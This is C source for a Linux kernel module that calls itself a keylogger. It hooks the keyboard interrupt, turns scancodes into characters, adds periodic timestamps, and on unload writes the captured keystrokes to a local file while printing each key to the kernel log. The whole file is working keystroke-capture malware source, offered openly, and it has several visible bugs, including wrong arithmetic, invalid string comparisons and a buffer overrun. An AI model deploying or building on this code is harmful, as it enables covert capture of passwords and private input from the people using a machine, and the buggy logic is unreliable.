#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/init.h>
#include <asm/segment.h>
#include <linux/buffer_head.h>
#include <linux/interrupt.h>
#include <asm/io.h>
#include <linux/mutex.h>
//#include <sharedVariable.h>

#include <linux/hrtimer.h>
#include <linux/sched.h>

#ifndef __KERNEL__
#define __KERNEL__
#endif

// keyboard constants/variables
#define KBD_INPUT_PORT	0x60    /* address of keyboard input buffer */
#define LEFT_SHIFT 0x2a
#define RIGHT_SHIFT 0x36
#define LEFT_SHIFT_RELEASE 0xaa
#define RIGHT_SHIFT_RELEASE 0xb6
int shiftPressed = 0;
#define CAPS_LOCK 0x3a
int capsLockEnabled = 0;
#define NORMAL_MODE 0
#define SHIFT_MODE 1
#define CAPS_LOCK_MODE 2
#define SHIFT_CAPS_LOCK_MODE 3
#define NUMBER_OF_MODES 3 // TODO: change to 4 when shift+caps_lock implemented

// output file constants/variables
#define OUTPUT_MODE 0644
const char* path = "./output.txt"; //temporary
struct file *outfile;
int count = 0;
//char* path;

// character buffer variables
#define B_SIZE 1000
char* char_buffer[B_SIZE];
int pos = 0;
int rollover = 0;
struct mutex buffer_mutex; // used whenever the character buffer is modified

// timer and timestamp variables
static struct hrtimer ts_timer;
static ktime_t ts_period;
#define TS_TIMER_PERIOD 15
#define TS_SIZE 10
char timestamp[TS_SIZE];

// FUNCTION PROTOTYPES
struct file *createFile(const char *path);
int writeToFile(struct file *file, unsigned long long offset, unsigned char *data, unsigned int size);
void closeFile(struct file *file);
static irqreturn_t get_scancode(int irq, void *id);
void scancode_to_key(char scancode);
void check_shift(unsigned char scancode);
void write_buffer_to_output(void);
void generate_timestamp(void);
static void initialize_timers(void);
static enum hrtimer_restart print_timestamp(struct hrtimer * timer);
static void remove_timers(void);
int get_timestamp_index(char c);

//Matrix of all characters we will be tracking. Assuming a standard 101/102 US keyboard
/* For the 2nd index: 	index = 0, no special keys enabled
			index = 1, only shift enabled
			index = 2, only caps lock enabled
			index = 3, both caps lock and shift enabled
*/
char *scancodes[][NUMBER_OF_MODES] = {
	{"/0", "/0", "/0"}, 	{"/e", "/e", "/e"}, 	{"1", "!", "1"}, 
	{"2", "@", "2"}, 		{"3", "#", "3"}, 		{"4", "$", "4"}, 
	{"5", "%", "5"}, 		{"6", "^", "6"}, 		{"7", "&", "7"}, 
	{"8", "*", "8"}, 		{"9", "(", "9"}, 		{"0", ")", "0"}, 
	{"-","_", "-"}, 		{"=", "+", "="}, 		{"/b", "/b", "/b"}, 
	{"/t", "/t", "/t"}, 	{"q", "Q", "Q"}, 		{"w", "W", "W"},
	{"e", "E", "E"}, 		{"r","R", "R"}, 		{"t", "T", "T"}, 
	{"y", "Y", "Y"}, 		{"u", "U", "U"}, 		{"i","I", "I"}, 
	{"o", "O", "O"},		{"p", "P", "P"},		{"[", "{", "["}, 
	{"]", "}", "]"}, 		{"/n", "/n", "/n"}, 	{"LCtrl", "LCtrl", "LCtrl"}, 
	{"a", "A", "A"}, 		{"s", "S", "S"}, 		{"d", "D", "D"}, 
	{"f", "F", "F"}, 		{"g", "G", "G"}, 		{"h", "H", "H"}, 
	{"j", "J", "J"}, 		{"k", "K", "K"}, 		{"l", "L", "L"}, 
	{";", ":", ";"}, 		{"\'", "\"", "\'"}, 	{"`", "~", "`"},
	{"LShift","LShift","LShift"},				{"\\", "|", "\\"}, 
	{"z", "Z", "Z"}, 		{"x", "X", "X"}, 		{"c", "C", "C"}, 
	{"v", "V", "V"}, 		{"b", "B", "B"}, 		{"n", "N", "N"},
	{"m", "M", "M"}, 		{",", "<", ","}, 		{".", ">", "."},
	{"/", "?", "/"},		{"RShift", "RShift", "RShift"},
	{"PrtScn", "KeyPad", "PrtScn"},				{"LAlt", "LAlt", "LAlt"}, 
	{" ", " ", " "}, 		{"CapsLock", "CapsLock", "CapsLock"}, 
	{"F1", "F1", "F1"}, 	{"F2", "F2", "F2"}, 	{"F3", "F3", "F3"}, 
	{"F4", "F4", "F4"}, 	{"F5", "F5", "F5"}, 	{"F6", "F6", "F6"},
	{"F7", "F7", "F7"}, 	{"F8", "F8", "F8"}, 	{"F9", "F9", "F9"},
	{"F10", "F10", "F10"}, 	{"NumLock", "NumLock", "NumLock"}, 
	{"ScrlLck", "ScrlLck", "ScrlLck"}, 			{"Keypad-7", "Home", "Keypad-7"}, 
	{"Keypad-8", "Up", "Keypad-8"}, 				{"Keypad-9", "PgUp", "Keypad-9"}, 
	{"-", "-", "-"},		{"Keypad-4", "Left", "Keypad-4"},
	{"Keypad-5", "Keypad-5", "Keypad-5"},		{"Keypad-6", "Right", "Keypad-6"},
	{"+", "+", "+"}, 		{"Keypad-1", "End", "Keypad-1"}, 
	{"Keypad-2", "Down", "Keypad-2"}, 			{"Keypad-3", "PgDn", "Keypad-3"},
	{"Keypad-0", "Ins", "Keypad-0"}, 			{"Keypad-.", "Del", "Keypad-."}, 
	{"Alt-SysRq", "Alt-SysRq", "Alt-SysRq"}, 		{"\0", "\0", "\0"}, 
	{"\0", "\0", "\0"}, 	{"F11", "F11", "F11"}, 	{"F12", "F12", "F12"} };                                  

//Creating the output file
struct file *createFile(const char *path) 
{
    struct file *fileP = NULL;
    mm_segment_t oldFileSpace;
    int err = 0;

    oldFileSpace = get_fs();
    set_fs(get_ds());
    fileP = filp_open(path, O_CREAT | O_APPEND | O_WRONLY, OUTPUT_MODE);
    set_fs(oldFileSpace);
    if (IS_ERR(fileP)) {
        err = PTR_ERR(fileP);
        return NULL;
    }
    return fileP;
}

//Write to the output file
int writeToFile(struct file *file, unsigned long long offset, unsigned char *data, unsigned int size) 
{
    mm_segment_t oldFileSpace;
    int ret;

    oldFileSpace = get_fs();
    set_fs(get_ds());

    ret = vfs_write(file, data, size, &offset);

    set_fs(oldFileSpace);
    return ret;
}

void closeFile(struct file *file) 
{
    filp_close(file, NULL);
}

// gets the scancode of each pressed key
static irqreturn_t get_scancode(int irq, void *id)
{
	unsigned char scancode;
	scancode = inb(KBD_INPUT_PORT);
	check_shift(scancode);
	scancode_to_key(scancode);
	return IRQ_HANDLED;
}

void scancode_to_key(char scancode)
{
	if (scancodes[scancode][0] != '\0')
	{
		mutex_lock(&buffer_mutex);

		if (capsLockEnabled == 1 && shiftPressed == 0) // only caps lock enabled
		{
			printk("%s\n", scancodes[scancode][CAPS_LOCK_MODE]);
			char_buffer[pos] = scancodes[scancode][CAPS_LOCK_MODE];
		}

		//TODO: implement
/*
		else if (capsLockEnabled == 1 && shiftPressed == 1) // both caps lock and shift enabled
		{
			printk("%s\n", scancodes[scancode][SHIFT_CAPS_LOCK_MODE]);
			char_buffer[pos] = scancodes[scancode][SHIFT_CAPS_LOCK_MODE];
		}
*/

		else if (capsLockEnabled == 0 && shiftPressed == 1) // only shift enabled
		{
			printk("%s\n", scancodes[scancode][SHIFT_MODE]);
			char_buffer[pos] = scancodes[scancode][SHIFT_MODE];
		}

		else // neither caps lock or shift enabled
		{
			printk("%s\n", scancodes[scancode][NORMAL_MODE]);
			char_buffer[pos] = scancodes[scancode][NORMAL_MODE];
		}

		pos++;

		if (pos >= B_SIZE) 
		{
			pos = 0;
			rollover++;
		}

		mutex_unlock(&buffer_mutex);
	}
}

void check_shift(unsigned char scancode)
{
	if (scancode == LEFT_SHIFT || scancode == RIGHT_SHIFT)
	{
		printk("Shift now enabled.");
		shiftPressed = 1;
	}

	if (scancode == LEFT_SHIFT_RELEASE || scancode == RIGHT_SHIFT_RELEASE)
	{
		printk("Shift now disabled.");
		shiftPressed = 0;
	}

	if (scancode == CAPS_LOCK && capsLockEnabled == 0)
	{
		printk("Caps Lock now enabled.");
		capsLockEnabled = 1;
	}

	//TODO: implement
/*
	if (scancode == CAPS_LOCK && capsLockEnabled == 1)
	{
		printk("Caps Lock now disabled.");
		capsLockEnabled = 0;
	}
*/
}

// writes all the characters stored in the buffer to the output file
void write_buffer_to_output(void)
{
	int i = 0;
	int max_size = B_SIZE;
	char* display_count = "Words this program captured: ";
 
	if (rollover == 0)
	{
		max_size = pos;
	}

	while (i < max_size)
	{
		writeToFile(outfile, 0, char_buffer[i], 1);
		if(char_buffer[i]  == " " || char_buffer[i] == "/L"){
		  count =+ 1;
		}
		i++;
	}
	
	display_count += count;
writeToFile(outfile, 0, display_count, 1);
	printk("Character buffer written to output.\n");
}

void generate_timestamp(void)
{
	long total_sec;
	int hr, min, sec;
    struct timeval time;

    do_gettimeofday(&time);
	total_sec = time.tv_sec;

	sec = total_sec % 60;
	min = (total_sec / 60) % 60;
	hr = (((total_sec / 3600) / 365) % 24) - 1;

	// build timestamp string
	sprintf(timestamp, "[%02d:%02d:%02d]", hr, min, sec);
	printk("Time: %s", timestamp);
}

static void initialize_timers(void)
{
	// timestamp timer
	ts_period = ktime_set(TS_TIMER_PERIOD, 0);
	hrtimer_init(&ts_timer, CLOCK_REALTIME, HRTIMER_MODE_REL);
	ts_timer.function = print_timestamp;
	hrtimer_start(&ts_timer, ts_period, HRTIMER_MODE_REL);
}

static enum hrtimer_restart print_timestamp(struct hrtimer * timer)
{
	char code;
	// adds a timestamp to the output file every 15 seconds
	mutex_lock(&buffer_mutex);
	generate_timestamp();

	code = timestamp[0];
	char_buffer[pos] = scancodes[get_timestamp_index(code)][0];
	code = timestamp[1];
	char_buffer[pos+1] = scancodes[get_timestamp_index(code)][0];
	code = timestamp[2];
	char_buffer[pos+2] = scancodes[get_timestamp_index(code)][0];
	code = timestamp[3];
	char_buffer[pos+3] = scancodes[get_timestamp_index(code)][1];
	code = timestamp[4];
	char_buffer[pos+4] = scancodes[get_timestamp_index(code)][0];
	code = timestamp[5];
	char_buffer[pos+5] = scancodes[get_timestamp_index(code)][0];
	code = timestamp[6];
	char_buffer[pos+6] = scancodes[get_timestamp_index(code)][1];
	code = timestamp[7];
	char_buffer[pos+7] = scancodes[get_timestamp_index(code)][0];
	code = timestamp[8];
	char_buffer[pos+8] = scancodes[get_timestamp_index(code)][0];
	code = timestamp[9];
	char_buffer[pos+9] = scancodes[get_timestamp_index(code)][0];

	pos = pos + TS_SIZE;

	mutex_unlock(&buffer_mutex);

	hrtimer_forward_now(timer, ts_period);
	return HRTIMER_RESTART;
}

static void remove_timers(void)
{
    hrtimer_cancel(&ts_timer);
}

int get_timestamp_index(char c)
{
	int index = 0;
	switch(c)
	{
		case '[':
			index = 0x1a;
			break;
		case ']':
			index = 0x1b;
			break;
		case ':':
			index = 0x27;
			break;
		case '0':
			index = 0x0b;
			break;
		case '1':
			index = 0x02;
			break;
		case '2':
			index = 0x03;
			break;
		case '3':
			index = 0x04;
			break;
		case '4':
			index = 0x05;
			break;
		case '5':
			index = 0x06;
			break;
		case '6':
			index = 0x07;
			break;
		case '7':
			index = 0x08;
			break;
		case '8':
			index = 0x09;
			break;
		case '9':
			index = 0x0a;
			break;
	}

	return index;
}
  
MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("A kernel-based keylogger module");

int __init init_keylogger(void)
{
	printk(KERN_INFO "Hello! Keylogger module successfully loaded.\n");
	mutex_init(&buffer_mutex);
	outfile = createFile(path);
	generate_timestamp();
	initialize_timers();
	request_irq(1, get_scancode, IRQF_SHARED, "kbd2", (void *)get_scancode);
	return 0;
}

void __exit exit_module(void)
{
	printk(KERN_INFO "Exiting keylogger kernel module.\n");
	free_irq(1, (void *)get_scancode);
	write_buffer_to_output();
	closeFile(outfile);
	remove_timers();	
	return;
}

module_init(init_keylogger);
module_exit(exit_module);
